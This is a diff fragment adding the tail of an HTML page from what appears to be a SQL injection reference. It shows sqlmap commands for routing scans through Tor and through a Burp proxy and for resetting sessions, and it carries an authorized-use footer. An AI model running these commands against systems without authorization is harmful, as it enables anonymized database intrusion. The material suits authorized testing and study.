+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -r req.txt --batch --tor --tor-type=SOCKS5 --check-tor</code></pre></figure>
+<h3 id="through-burp-for-replay">"Through Burp for replay"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -r req.txt --batch --proxy=http://127.0.0.1:8080 --ignore-certs</code></pre></figure>
+<h3 id="reset-everything">"Reset everything"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -r req.txt --flush-session</code></pre></figure></article><nav class="cx-pager"><a class="cx-prev" href="../troubleshooting/index.html">Previous: Troubleshooting</a><a class="cx-next" href="../../blind-error/index.html">Next: Error-based Blind SQLi</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
